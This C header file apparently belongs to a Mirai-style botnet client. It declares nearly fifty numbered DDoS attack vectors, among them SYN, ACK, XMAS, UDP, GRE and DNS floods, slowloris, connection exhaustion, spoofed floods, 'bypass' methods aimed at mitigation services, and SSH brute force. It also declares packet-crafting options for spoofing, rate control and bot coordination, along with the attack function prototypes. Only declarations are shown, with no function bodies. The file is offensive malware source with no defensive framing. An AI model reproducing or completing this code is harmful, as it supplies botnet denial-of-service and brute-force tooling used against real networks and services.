#pragma once
#include <time.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include <stdint.h>
#include "includes.h"
#include "protocol.h"
#define ATTACK_CONCURRENT_MAX  1
#define HTTP_CONNECTION_MAX     500
struct attack_target {
    struct sockaddr_in sock_addr;
    ipv4_t addr;
    uint8_t netmask;
};
struct attack_option {
    char *val;
    uint8_t key;
};
typedef void (*ATTACK_FUNC) (uint8_t, struct attack_target *, uint8_t, struct attack_option *);
typedef uint8_t ATTACK_VECTOR;
#define ATK_VEC_STOMP      0
#define ATK_VEC_UDP_PLAIN  1
#define ATK_VEC_STD        2
#define ATK_VEC_TCP        3
#define ATK_VEC_ACK        4
#define ATK_VEC_SYN        5
#define ATK_VEC_HEXFLOOD   6
#define ATK_VEC_STDHEX     7
#define ATK_VEC_NUDP       8
#define ATK_VEC_UDPHEX     9
#define ATK_VEC_XMAS       10
#define ATK_VEC_TCPBYPASS  11
#define ATK_VEC_RAW        12
#define ATK_VEC_UDP_CUSTOM 13
#define ATK_VEC_OVHTCP 14
#define ATK_VEC_TCP_HANDSHAKE 15
#define ATK_VEC_CONN_EXHAUST 16
#define ATK_VEC_SLOWLORIS_TCP 17
#define ATK_VEC_SLOWLORIS_UDP 18
#define ATK_VEC_UDP_FRAG 19
#define ATK_VEC_RS_MEDIA 20
#define ATK_VEC_SOCKET 21
#define ATK_VEC_ZCONNECT 22
#define ATK_VEC_SPOOFED 23
#define ATK_VEC_BOMB 24
#define ATK_VEC_TCP_FULL 25
#define ATK_VEC_UDP_PPS 26
#define ATK_VEC_TCP_CONNECT 27
#define ATK_VEC_RIP 28
#define ATK_VEC_UDP_BIG 29
#define ATK_VEC_ORBIT_PPS 30
#define ATK_VEC_ORBIT_V4 31
#define ATK_VEC_SSH_BRUTEFORCE 32
#define ATK_VEC_TCP_IPI 33
#define ATK_VEC_GREIP 34
#define ATK_VEC_GREETH 35
#define ATK_VEC_TCPSYN 36
#define ATK_VEC_RANDHEX 37
#define ATK_VEC_TCPACK 38
#define ATK_VEC_TCPSTOMP 39
#define ATK_VEC_UDPGENERIC 40
#define ATK_VEC_UDPVSE 41
#define ATK_VEC_UDPDNS 42
#define ATK_VEC_ICE 43
#define ATK_VEC_TCPALL 44
#define ATK_VEC_TCPFRAG 45
#define ATK_VEC_ASYN 46
#define ATK_VEC_AUTOBYPASS 47
#define ATK_OPT_PAYLOAD_SIZE    0   
#define ATK_OPT_PAYLOAD_RAND    1   
#define ATK_OPT_IP_TOS          2   
#define ATK_OPT_IP_IDENT        3   
#define ATK_OPT_IP_TTL          4   
#define ATK_OPT_IP_DF           5   
#define ATK_OPT_SPORT           6   
#define ATK_OPT_DPORT           7   
#define ATK_OPT_DOMAIN          8   
#define ATK_OPT_DNS_HDR_ID      9   
#define ATK_OPT_URG             11  
#define ATK_OPT_ACK             12  
#define ATK_OPT_PSH             13  
#define ATK_OPT_RST             14  
#define ATK_OPT_SYN             15  
#define ATK_OPT_FIN             16  
#define ATK_OPT_SEQRND          17  
#define ATK_OPT_ACKRND          18  
#define ATK_OPT_GRE_CONSTIP     19  
#define ATK_OPT_METHOD			20	
#define ATK_OPT_POST_DATA		21	
#define ATK_OPT_PATH            22  
#define ATK_OPT_HTTPS           23  
#define ATK_OPT_CONNS           24  
#define ATK_OPT_SOURCE          25  
#define ATK_OPT_MIN_SIZE        26  
#define ATK_OPT_MAX_SIZE        27  
#define ATK_OPT_PAYLOAD_ONE     28  
#define ATK_OPT_PAYLOAD_REPEAT  29  
#define ATK_OPT_RATELIMIT       30
#define ATK_OPT_CIDR_RANGE      36
#define ATK_OPT_DICT_NAME       37
#define ATK_OPT_SCAN_MODE       38
#define ATK_OPT_BOT_ID          39
#define ATK_OPT_TOTAL_BOTS      40
#define ATK_OPT_THREADS         31
#define ATK_OPT_AUTH            32
#define ATK_OPT_PORT            33
#define ATK_OPT_DURATION        34
#define ATK_OPT_AUTOBYPASS_PROTOCOLS 43
#define ATK_OPT_AUTOBYPASS_CONFIG_NAME 44
#define ATK_OPT_RAWSOCKET           45
#define ATK_OPT_BINDDEV             46
#define ATK_OPT_SNDBUF              47
#define ATK_OPT_SRCMODE             48
#define ATK_OPT_SRCSTART            49
#define ATK_OPT_SRCEND              50
#define ATK_OPT_IPIDMODE            51
#define ATK_OPT_MF                  52
#define ATK_OPT_FRAGOFF             53
#define ATK_OPT_MSS                 54
#define ATK_OPT_WIN                 55
#define ATK_OPT_WSCALE              56
#define ATK_OPT_SACK                57
#define ATK_OPT_TS                  58
#define ATK_OPT_NOP                 59
#define ATK_OPT_PPS                 62
#define ATK_OPT_BPS                 63
#define ATK_OPT_BURST               64
#define ATK_OPT_PAYLOADMODE         65
#define ATK_OPT_PAYLOADPAT          66
#define ATK_OPT_OSFP                67
#define ATK_OPT_TTLRAND             68
#define ATK_OPT_TTLMIN              69
#define ATK_OPT_TTLMAX              70
#define ATK_OPT_PORTRAND            71
#define ATK_OPT_PORTMIN             72
#define ATK_OPT_PORTMAX             73
#define ATK_OPT_TCPFLAGS            74
#define ATK_OPT_TCPFLAGSMODE        75
#define ATK_OPT_IPDELAY             76
#define ATK_OPT_JITTER              77
#define ATK_OPT_PACKETORDER         78
#define ATK_OPT_BURSTPAT            79
#define ATK_OPT_SIZERAND            80
#define ATK_OPT_SIZEMIN             81
#define ATK_OPT_SIZEMAX             82
#define ATK_OPT_SPORTRAND           83
#define ATK_OPT_SPORTMIN            84
#define ATK_OPT_SPORTMAX            85
#define ATK_OPT_SEQPAT              86
#define ATK_OPT_ACKPAT              87
#define ATK_OPT_SEQINC              88
#define ATK_OPT_ACKINC              89
#define ATK_OPT_IPPREC              90
#define ATK_OPT_DSCP                91
#define ATK_OPT_ECN                 92
#define ATK_OPT_URGPTR              93
#define ATK_OPT_WINRAND             94
#define ATK_OPT_WINMIN              95
#define ATK_OPT_WINMAX              96
#define ATK_OPT_MSSRAND             97
#define ATK_OPT_MSSMIN              98
#define ATK_OPT_MSSMAX              99
#define ATK_OPT_KEEPALIVE           100
#define ATK_OPT_KEEPINT             101
#define ATK_OPT_RETRY               102
#define ATK_OPT_TIMEOUT             103
#define ATK_OPT_CONGESTION          104
struct attack_method {
    ATTACK_FUNC func;
    ATTACK_VECTOR vector;
};
struct attack_stomp_data {
    ipv4_t addr;
    uint32_t seq, ack_seq;
    port_t sport, dport;
};
struct attack_xmas_data {
    ipv4_t addr;
    uint32_t seq, ack_seq;
    port_t sport, dport;
};
BOOL attack_init(void);
void attack_kill_all(void);
void attack_parse(char *, int);
void attack_start(int, ATTACK_VECTOR, uint8_t, struct attack_target *, uint8_t, struct attack_option *);
char *attack_get_opt_str(uint8_t, struct attack_option *, uint8_t, char *);
int attack_get_opt_int(uint8_t, struct attack_option *, uint8_t, int);
uint32_t attack_get_opt_ip(uint8_t, struct attack_option *, uint8_t, uint32_t);
void attack_udp_plain(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_stomp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_tcp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_std(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_ack(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_syn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_hexflood(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_stdhex(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_nudp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_udphex(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_tcpxmas(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_bypass(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_custom(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_raw(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_ovhtcp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_handshake(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_connexhaust(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_slowloris_tcp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_slowloris_udp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_frag(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_rs_media(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_socket_flood(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_zconnect(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_spoofed(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_bomb(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_full(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_pps(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_connect(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_rip(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_big(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_orbitpps(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_orbitv4(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_ssh_bruteforce(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_ipi(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_greip(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_greeth(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_tcpsyn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_randhex(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_tcpack(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_tcpstomp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_udpgeneric(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_udpvse(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_udpdns(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_ice(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_tcpall(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_tcpfrag(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_asyn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_autobypass(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
static void add_attack(ATTACK_VECTOR, ATTACK_FUNC);
static void free_opts(struct attack_option *, int);
